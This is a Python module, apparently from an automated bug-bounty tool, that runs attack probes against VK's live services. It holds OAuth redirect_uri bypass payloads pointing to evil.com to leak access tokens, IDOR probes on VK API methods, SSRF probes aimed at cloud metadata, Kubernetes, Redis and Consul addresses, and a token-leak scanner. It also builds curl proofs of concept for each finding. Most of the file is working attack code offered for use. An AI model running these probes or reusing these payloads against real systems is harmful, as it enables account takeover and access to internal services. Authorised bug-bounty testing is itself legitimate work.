"""
VK Bug Bounty — Common Attack Pattern Executors
=================================================
Executors targeting patterns that have historically paid in VK's program.
Each executor tests a specific high-value attack vector on VK targets.

Usage:
    from demogorgon.programs.vk.executors import VKAttackSuite
    suite = VKAttackSuite(http_client)
    results = await suite.run_all("id.vk.com")
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Forward reference for type checking; actual import at runtime
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from demogorgon.tools.http_client import HttpClient


@dataclass
class VKAttackResult:
    """Result of a VK-specific attack test."""
    executor_name: str
    target: str
    vulnerable: bool
    severity: str           # "critical", "high", "medium", "low", "info"
    title: str
    description: str
    evidence: list[str] = field(default_factory=list)
    poc_curl: str = ""
    poc_command: str = ""
    requires_auth: bool = True
    bounty_potential: str = "MEDIUM"  # "MAX", "HIGH", "MEDIUM", "LOW"
    category: str = "other"           # Maps to VK bounty category
    extra: dict = field(default_factory=dict)


class VKOAuthBypass:
    """
    Test VK OAuth flow for token leakage and misconfiguration.
    HIGH VALUE: OAuth token leakage → Account Takeover → MAX bounty.
    """

    NAME = "VK OAuth Bypass"

    OAUTH_ENDPOINTS = [
        "https://oauth.vk.com/authorize",
        "https://oauth.vk.com/access_token",
        "https://id.vk.com/oauth2",
    ]

    REDIRECT_MANIPULATION = [
        # Standard open redirect via redirect_uri manipulation
        {"param": "redirect_uri", "evil": "https://evil.com/callback"},
        {"param": "redirect_uri", "evil": "https://evil.com.%60vk.com/callback"},
        {"param": "redirect_uri", "evil": "https://evil.com%00.vk.com/callback"},
        {"param": "redirect_uri", "evil": "//evil.com/callback"},
        {"param": "redirect_uri", "evil": "https://evil.com\\@vk.com/callback"},
    ]

    STATE_MANIPULATION = [
        # Missing or bypassable state parameter
        {"remove": ["state"]},
        {"modify": {"state": ""}},
        {"modify": {"state": "null"}},
    ]

    async def run(self, http: "HttpClient", target: str = "oauth.vk.com") -> list[VKAttackResult]:
        results = []

        # Test 1: redirect_uri manipulation on authorize endpoint
        for manipulation in self.REDIRECT_MANIPULATION:
            try:
                params = {
                    "client_id": "1",  # VK App ID
                    "redirect_uri": manipulation["evil"],
                    "response_type": "token",
                    "v": "5.131",
                }

                resp = await http.get(
                    f"https://{target}/authorize",
                    params=params,
                    follow_redirects=False,
                )

                # Check if the evil redirect is reflected in the response
                if resp.status_code in (301, 302, 303):
                    location = resp.headers.get("location", "")
                    if "evil.com" in location:
                        results.append(VKAttackResult(
                            executor_name=self.NAME,
                            target=target,
                            vulnerable=True,
                            severity="critical",
                            title="OAuth Token Leakage via Redirect URI Manipulation",
                            description=(
                                f"VK OAuth endpoint accepts malicious redirect_uri. "
                                f"After user authorization, the access token is leaked to {manipulation['evil']}. "
                                f"This enables full account takeover."
                            ),
                            evidence=[f"Location: {location}", f"Request: {manipulation}"],
                            poc_curl=(
                                f'curl -v "https://{target}/authorize?'
                                f'client_id=1&redirect_uri={manipulation["evil"]}'
                                f'&response_type=token&v=5.131"'
                            ),
                            requires_auth=True,
                            bounty_potential="MAX",
                            category="account_takeover",
                        ))
                elif resp.status_code == 200:
                    body = resp.text
                    if "evil.com" in body or "error" not in body.lower():
                        results.append(VKAttackResult(
                            executor_name=self.NAME,
                            target=target,
                            vulnerable=False,
                            severity="info",
                            title="OAuth redirect_uri Reflected (Not Redirected)",
                            description="redirect_uri is reflected in page but no token leak observed.",
                            evidence=[f"Body length: {len(body)}"],
                            bounty_potential="LOW",
                            category="open_redirect",
                        ))

            except Exception as e:
                results.append(VKAttackResult(
                    executor_name=self.NAME,
                    target=target,
                    vulnerable=False,
                    severity="info",
                    title=f"OAuth Test Error: {str(e)[:80]}",
                    description=f"Error testing redirect_uri manipulation",
                    evidence=[str(e)],
                ))

        # Test 2: State parameter check
        for state_test in self.STATE_MANIPULATION:
            try:
                params = {
                    "client_id": "1",
                    "redirect_uri": "https://example.com/callback",
                    "response_type": "token",
                    "v": "5.131",
                }
                if "remove" in state_test:
                    # Don't include state parameter
                    pass
                elif "modify" in state_test:
                    params.update(state_test["modify"])

                resp = await http.get(
                    f"https://{target}/authorize",
                    params=params,
                    follow_redirects=False,
                )

                # If no error about missing state, it might be vulnerable
                if resp.status_code == 200 and "state" not in resp.text.lower():
                    results.append(VKAttackResult(
                        executor_name=self.NAME,
                        target=target,
                        vulnerable=False,
                        severity="low",
                        title="OAuth Missing State Parameter",
                        description="OAuth authorize endpoint does not enforce state parameter, enabling CSRF on OAuth flow.",
                        evidence=[f"Status: {resp.status_code}"],
                        bounty_potential="LOW",
                        category="csrf",
                    ))

            except Exception as e:
                pass

        if not results:
            results.append(VKAttackResult(
                executor_name=self.NAME,
                target=target,
                vulnerable=False,
                severity="info",
                title="OAuth Flow — No Vulnerabilities Found",
                description="OAuth endpoints responded with expected security controls.",
                bounty_potential="LOW",
                category="auth_bypass",
            ))

        return results


class VKIDORDetector:
    """
    Test common VK API endpoints for IDOR.
    MEDIUM-HIGH VALUE: IDOR on user data → Private Message Reading → MAX bounty.
    """

    NAME = "VK IDOR Detector"

    # Common VK API methods that handle user data
    VK_API_METHODS = [
        {"method": "users.get", "params": {"user_ids": "1,2,3", "fields": "photo_200,city,home_town"}},
        {"method": "friends.get", "params": {"user_id": "1", "order": "name"}},
        {"method": "messages.getConversations", "params": {"count": "5"}},
        {"method": "wall.get", "params": {"owner_id": "1", "count": "5"}},
        {"method": "photos.getAll", "params": {"count": "5"}},
        {"method": "video.get", "params": {"owner_id": "1", "count": "5"}},
    ]

    # User ID manipulation patterns
    ID_MANIPULATION = [
        {"param": "user_id", "values": ["0", "-1", "999999999", "admin", "test"]},
        {"param": "owner_id", "values": ["0", "-1", "999999999"]},
        {"param": "user_ids", "values": ["1,2,3,4,5", "0,1,2"]},
    ]

    async def run(self, http: "HttpClient", target: str = "api.vk.com") -> list[VKAttackResult]:
        results = []

        for api_method in self.VK_API_METHODS:
            for manipulation in self.ID_MANIPULATION:
                try:
                    params = {
                        "method": api_method["method"],
                        "access_token": "test_token",  # Will get auth error but reveals behavior
                        "v": "5.131",
                    }
                    params.update(api_method["params"])

                    # Modify the target parameter
                    for param, values in zip(
                        [manipulation["param"]],
                        [manipulation["values"]]
                    ):
                        if param in params or param in api_method["params"]:
                            test_params = dict(params)
                            if param in test_params:
                                test_params[param] = values[0]

                            resp = await http.get(
                                f"https://{target}/method/{api_method['method']}",
                                params=test_params,
                            )

                            body = resp.text

                            # Check for IDOR indicators:
                            # 1. Response contains user data despite wrong token
                            # 2. No authorization error
                            # 3. Different data for different user_ids
                            has_user_data = any(k in body for k in [
                                '"first_name"', '"last_name"', '"photo"',
                                '"message"', '"text"', '"body"',
                            ])
                            no_auth_error = "access_denied" not in body and "auth" not in body.lower()

                            if has_user_data and no_auth_error:
                                results.append(VKAttackResult(
                                    executor_name=self.NAME,
                                    target=target,
                                    vulnerable=True,
                                    severity="high",
                                    title=f"Potential IDOR in {api_method['method']}",
                                    description=(
                                        f"API method {api_method['method']} returned user data "
                                        f"when {param}={values[0]} without proper authorization check."
                                    ),
                                    evidence=[f"Response: {body[:500]}"],
                                    poc_curl=(
                                        f'curl "https://{target}/method/{api_method["method"]}'
                                        f'?{param}={values[0]}'
                                        f'&access_token=<TOKEN>'
                                        f'&v=5.131"'
                                    ),
                                    requires_auth=True,
                                    bounty_potential="HIGH" if "message" in api_method["method"] else "MEDIUM",
                                    category="idor",
                                    extra={"api_method": api_method["method"], "param": param},
                                ))

                except Exception as e:
                    pass

        if not results:
            results.append(VKAttackResult(
                executor_name=self.NAME,
                target=target,
                vulnerable=False,
                severity="info",
                title="IDOR Scan — No Vulnerabilities Found",
                description="API methods returned expected authorization errors.",
                bounty_potential="LOW",
                category="idor",
            ))

        return results


class VKSSRFProbe:
    """
    Test VK endpoints for SSRF.
    HIGH VALUE: SSRF to internal VK services → Cross-service access → MAX bounty.
    """

    NAME = "VK SSRF Probe"

    # VK-specific internal endpoints to probe for
    INTERNAL_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://kubernetes.default.svc/",
        "http://localhost:8080/",
        "http://127.0.0.1:6379/",  # Redis
        "http://consul:8500/",       # Consul
    ]

    # VK endpoints that commonly accept URLs
    URL_ACCEPTING_ENDPOINTS = [
        {"endpoint": "/method/photos.save", "param": "url"},
        {"endpoint": "/method/photos.getOwnerPhoto", "param": "owner_id"},
        {"endpoint": "/method/video.save", "param": "link"},
        {"endpoint": "/method/docs.save", "param": "url"},
        {"endpoint": "/method/apps.getCatalog", "param": "url"},
    ]

    async def run(self, http: "HttpClient", target: str = "api.vk.com") -> list[VKAttackResult]:
        results = []

        for endpoint in self.URL_ACCEPTING_ENDPOINTS:
            for internal_url in self.INTERNAL_TARGETS[:3]:  # Test first 3
                try:
                    params = {
                        "access_token": "test_token",
                        "v": "5.131",
                        endpoint["param"]: internal_url,
                    }

                    resp = await http.get(
                        f"https://{target}{endpoint['endpoint']}",
                        params=params,
                        timeout=10,
                    )

                    body = resp.text

                    # Check for SSRF indicators
                    ssrf_indicators = [
                        "ami-id" in body,                    # AWS metadata
                        "instance-id" in body,               # AWS metadata
                        "local-ipv4" in body,                # AWS metadata
                        "hostname" in body and "kubernetes" in body,  # K8s
                        "redis_version" in body,             # Redis
                        "consul" in body,                    # Consul
                    ]

                    if any(ssrf_indicators):
                        results.append(VKAttackResult(
                            executor_name=self.NAME,
                            target=target,
                            vulnerable=True,
                            severity="critical",
                            title=f"SSRF via {endpoint['endpoint']}",
                            description=(
                                f"VK API endpoint {endpoint['endpoint']} makes requests to "
                                f"internal services via {endpoint['param']} parameter. "
                                f"Response contains data from {internal_url}."
                            ),
                            evidence=[f"Response: {body[:500]}"],
                            poc_curl=(
                                f'curl "https://{target}{endpoint["endpoint"]}'
                                f'?{endpoint["param"]}={internal_url}'
                                f'&access_token=<TOKEN>'
                                f'&v=5.131"'
                            ),
                            requires_auth=True,
                            bounty_potential="MAX",
                            category="ssrf",
                            extra={"internal_url": internal_url, "endpoint": endpoint["endpoint"]},
                        ))

                except Exception as e:
                    # Timeout might indicate the server is trying to connect
                    if "timeout" in str(e).lower() or "timed out" in str(e).lower():
                        results.append(VKAttackResult(
                            executor_name=self.NAME,
                            target=target,
                            vulnerable=False,
                            severity="medium",
                            title=f"Potential SSRF — Timeout on {endpoint['endpoint']}",
                            description=(
                                f"Request to {endpoint['endpoint']} with {internal_url} timed out. "
                                f"The server may be attempting to connect to internal services."
                            ),
                            evidence=[f"Error: {str(e)}"],
                            bounty_potential="MEDIUM",
                            category="ssrf",
                        ))

        if not results:
            results.append(VKAttackResult(
                executor_name=self.NAME,
                target=target,
                vulnerable=False,
                severity="info",
                title="SSRF Scan — No Vulnerabilities Found",
                description="URL-accepting endpoints did not make outbound requests to internal targets.",
                bounty_potential="LOW",
                category="ssrf",
            ))

        return results


class VKTokenLeakDetector:
    """
    Detect VK access tokens in responses, headers, and error messages.
    HIGH VALUE: Token leakage → Account Takeover → MAX bounty.
    """

    NAME = "VK Token Leak Detector"

    # Token patterns to search for in responses
    TOKEN_PATTERNS = [
        "access_token=",
        "token=",
        "Bearer ",
        "VK_TOKEN",
        "api_key=",
        "session_key=",
        "secret=",
    ]

    # VK-specific headers that might leak tokens
    INTERESTING_HEADERS = [
        "x-vk-token",
        "x-access-token",
        "x-api-key",
        "set-cookie",
        "x-session-id",
        "authorization",
    ]

    async def run(self, http: "HttpClient", target: str = "vk.com") -> list[VKAttackResult]:
        results = []

        # Test various VK endpoints for token leakage
        test_endpoints = [
            "/",
            "/login",
            "/feed",
            "/im",
            "/settings",
            "/dev",
            "/api",
            "/oauth2",
        ]

        for endpoint in test_endpoints:
            try:
                resp = await http.get(f"https://{target}{endpoint}")

                # Check response body for tokens
                body = resp.text
                for pattern in self.TOKEN_PATTERNS:
                    if pattern in body:
                        # Find the surrounding context
                        idx = body.index(pattern)
                        context = body[max(0, idx-50):idx+100]
                        results.append(VKAttackResult(
                            executor_name=self.NAME,
                            target=target,
                            vulnerable=True,
                            severity="critical",
                            title=f"Token Leak Found on {endpoint}",
                            description=f"Response contains '{pattern}' which may indicate exposed access token.",
                            evidence=[f"Context: ...{context}..."],
                            requires_auth=False,
                            bounty_potential="MAX",
                            category="account_takeover",
                        ))

                # Check response headers for token leakage
                for header in self.INTERESTING_HEADERS:
                    if header in resp.headers:
                        value = resp.headers[header]
                        if any(p in value.lower() for p in ["token", "key", "session"]):
                            results.append(VKAttackResult(
                                executor_name=self.NAME,
                                target=target,
                                vulnerable=True,
                                severity="high",
                                title=f"Sensitive Header on {endpoint}: {header}",
                                description=f"Response header '{header}' contains sensitive data.",
                                evidence=[f"{header}: {value[:100]}"],
                                requires_auth=False,
                                bounty_potential="HIGH",
                                category="info_disclosure",
                            ))

            except Exception as e:
                pass

        if not results:
            results.append(VKAttackResult(
                executor_name=self.NAME,
                target=target,
                vulnerable=False,
                severity="info",
                title="Token Leak Scan — No Leaks Found",
                description="No access tokens or sensitive headers found in responses.",
                bounty_potential="LOW",
                category="info_disclosure",
            ))

        return results


class VKAttackSuite:
    """
    Unified attack suite combining all VK-specific executors.
    """

    def __init__(self, http_client: "HttpClient"):
        self.http = http_client
        self.executors = [
            VKOAuthBypass(),
            VKIDORDetector(),
            VKSSRFProbe(),
            VKTokenLeakDetector(),
        ]

    async def run_all(self, target: str = "vk.com") -> list[VKAttackResult]:
        """Run all VK-specific attacks against a target."""
        all_results = []

        for executor in self.executors:
            try:
                results = await executor.run(self.http, target)
                all_results.extend(results)
            except Exception as e:
                all_results.append(VKAttackResult(
                    executor_name=executor.NAME,
                    target=target,
                    vulnerable=False,
                    severity="info",
                    title=f"Executor Error: {executor.NAME}",
                    description=f"Error running executor: {str(e)[:100]}",
                    evidence=[str(e)],
                ))

        return all_results

    def get_vulnerable(self, results: list[VKAttackResult]) -> list[VKAttackResult]:
        """Filter results to only vulnerable findings."""
        return [r for r in results if r.vulnerable]

    def get_max_bounty(self, results: list[VKAttackResult]) -> list[VKAttackResult]:
        """Filter results to MAX bounty potential findings."""
        return [r for r in results if r.bounty_potential == "MAX"]

    def summary(self, results: list[VKAttackResult]) -> str:
        """Generate summary of attack results."""
        vulnerable = self.get_vulnerable(results)
        max_bounty = self.get_max_bounty(results)

        lines = [
            f"Total Tests: {len(results)}",
            f"Vulnerable: {len(vulnerable)}",
            f"MAX Bounty: {len(max_bounty)}",
            "",
        ]

        if vulnerable:
            lines.append("VULNERABILITIES FOUND:")
            for v in vulnerable:
                lines.append(f"  [{v.severity.upper()}] {v.title}")
                lines.append(f"    Target: {v.target}")
                lines.append(f"    Bounty: {v.bounty_potential}")
                lines.append(f"    Category: {v.category}")
                lines.append("")
        else:
            lines.append("No vulnerabilities found.")

        return "\n".join(lines)
